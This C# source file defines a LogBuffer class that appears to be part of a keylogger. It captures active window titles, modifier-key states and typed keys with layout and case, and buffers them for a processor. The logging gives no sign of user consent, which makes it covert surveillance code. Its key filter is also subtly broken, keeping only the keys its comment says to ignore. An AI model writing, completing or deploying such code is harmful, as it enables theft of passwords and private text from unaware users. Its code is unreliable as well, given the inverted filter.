using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;
using wls.LogItems;

namespace wls.Buffer
{
    public class LogBuffer
    {
        private readonly List<ILogItem> _logItems = new List<ILogItem>();
        private string _appTitlePrev;
        private bool _ctrlPrev;
        private bool _altPrev;
        private bool _capsPrev;

        private readonly int[] _ignoreKeys =
                {
                    (int) Keys.ControlKey,
                    (int) Keys.ShiftKey,
                    (int) Keys.CapsLock,
                    (int) Keys.Menu
                };

        private readonly IBufferProcessor _bufferProcessor;

        public LogBuffer(IBufferProcessor bufferProcessor)
        {
            _bufferProcessor = bufferProcessor;
        }
        public void Add(IList<int> keys)
        {
            string activeAppTitle = KbApiWrapper.GetAppTitle();
            // check app title
            if (_appTitlePrev != activeAppTitle)
            {
                _logItems.Add(new LogAppTitle(activeAppTitle));
                _appTitlePrev = activeAppTitle;
            }
            // check toggle keys
            bool ctrl = KbApiWrapper.ToggleKeys.Ctrl;
            if (!_ctrlPrev && ctrl) _logItems.Add(new LogToggleKey("<Ctrl=On>"));
            if (_ctrlPrev && !ctrl) _logItems.Add(new LogToggleKey("<Ctrl=Off>"));
            _ctrlPrev = ctrl;

            bool alt = KbApiWrapper.ToggleKeys.Alt;
            if (!_altPrev && alt) _logItems.Add(new LogToggleKey("<Alt=On>"));
            if (_altPrev && !alt) _logItems.Add(new LogToggleKey("<Alt=Off>"));
            _altPrev = alt;

            bool caps = KbApiWrapper.ToggleKeys.CapsLock;
            if (!_capsPrev && caps) _logItems.Add(new LogToggleKey("<CapsLock=On>"));
            if (_capsPrev && !caps) _logItems.Add(new LogToggleKey("<CapsLock=Off>"));
            _capsPrev = caps;

            if (keys == null || keys.Count == 0) return;

            bool shift = KbApiWrapper.ToggleKeys.Shift;
            bool upper = (shift && !caps) || (!shift && caps);
            int keyboardLayout = KbApiWrapper.GetKeyboardLayout();
            // ignore the keys which are logged above
            var filteredKeys = keys.Where(r => _ignoreKeys.Contains(r));
            foreach (int key in filteredKeys)
            {
                _logItems.Add(new LogKey(key, keyboardLayout, upper));
            }
        }

        public string Flash()
        {
            string result = _bufferProcessor.Process(_logItems);
            _logItems.Clear();
            return result;
        }
    }
}
